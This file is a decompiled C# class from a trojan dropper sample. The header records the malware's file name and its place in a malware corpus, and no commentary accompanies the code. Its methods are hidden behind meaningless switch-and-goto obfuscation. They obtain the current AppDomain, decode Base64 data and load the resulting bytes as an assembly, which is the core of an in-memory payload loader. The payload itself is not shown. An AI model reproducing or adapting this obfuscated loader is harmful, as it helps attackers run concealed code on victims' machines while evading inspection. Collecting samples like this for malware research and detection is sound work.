// Decompiled with JetBrains decompiler
// Type: DrawPixelf.k
// Assembly: " ", Version=7.2.7601.17514, Culture=neutral, PublicKeyToken=null
// MVID: 25A0E72D-CDF2-414C-AAD0-2102BD6EFED8
// Assembly location: C:\Users\Administrateur\Desktop\Virusshare-00005-msil\Trojan-Dropper.Win32.Sysn.aaki-170714a1f3cc622f2d084fab72239335834b98cf8bc8809fe43c45f8e82ae697.exe

using System;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;

namespace DrawPixelf
{
  internal sealed class k
  {
    internal static AppDomain n([In] int obj0, [In] int obj1)
    {
label_3:
      int num1;
      switch (obj1 ^ obj0)
      {
        case 25:
          num1 = 4;
          break;
        default:
          num1 = 3;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 6:
            num2 = 1;
            continue;
          case 1:
            goto label_3;
          case 2:
          case 3:
            num2 = 1;
            continue;
          case 4:
          case 7:
            goto label_8;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (k.n);
            num2 = 1;
            continue;
        }
      }
label_8:
      return AppDomain.CurrentDomain;
    }

    internal sealed class w
    {
      internal sealed class x
      {
        internal static byte[] d([In] string obj0, [In] int obj1, [In] int obj2)
        {
label_3:
          int num1;
          switch (obj2 ^ obj1)
          {
            case 116:
              num1 = 2;
              break;
            default:
              num1 = 1;
              break;
          }
          int num2 = num1;
          while (true)
          {
            switch (num2)
            {
              case 0:
                num2 = 6;
                continue;
              case 1:
                num2 = 6;
                continue;
              case 2:
              case 5:
              case 7:
                goto label_8;
              case 3:
              case 6:
                goto label_3;
              default:
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle = __methodref (k.w.x.d);
                num2 = 6;
                continue;
            }
          }
label_8:
          return Convert.FromBase64String(obj0);
        }
      }

      internal sealed class u
      {
        internal static Assembly m([In] AppDomain obj0, [In] byte[] obj1, [In] int obj2, [In] int obj3)
        {
label_3:
          int num1;
          switch (obj3 ^ obj2)
          {
            case 119:
              num1 = 2;
              break;
            default:
              num1 = 1;
              break;
          }
          int num2 = num1;
          while (true)
          {
            switch (num2)
            {
              case 1:
                num2 = 6;
                continue;
              case 2:
                goto label_8;
              case 3:
              case 5:
              case 6:
                goto label_3;
              case 7:
                num2 = 6;
                continue;
              default:
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle = __methodref (k.w.u.m);
                num2 = 6;
                continue;
            }
          }
label_8:
          return obj0.Load(obj1);
        }

        internal static Encoding i([In] int obj0, [In] int obj1)
        {
label_3:
          int num1;
          switch ((obj1 ^ obj0) - 0)
          {
            case 0:
              num1 = 5;
              break;
            default:
              num1 = 7;
              break;
          }
          int num2 = num1;
          while (true)
          {
            switch (num2)
            {
              case 0:
              case 3:
                goto label_3;
              case 1:
                num2 = 3;
                continue;
              case 2:
              case 5:
              case 6:
                goto label_8;
              case 7:
                num2 = 3;
                continue;
              default:
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle = __methodref (k.w.u.i);
                num2 = 3;
                continue;
            }
          }
label_8:
          return Encoding.UTF8;
        }
      }
    }
  }
}
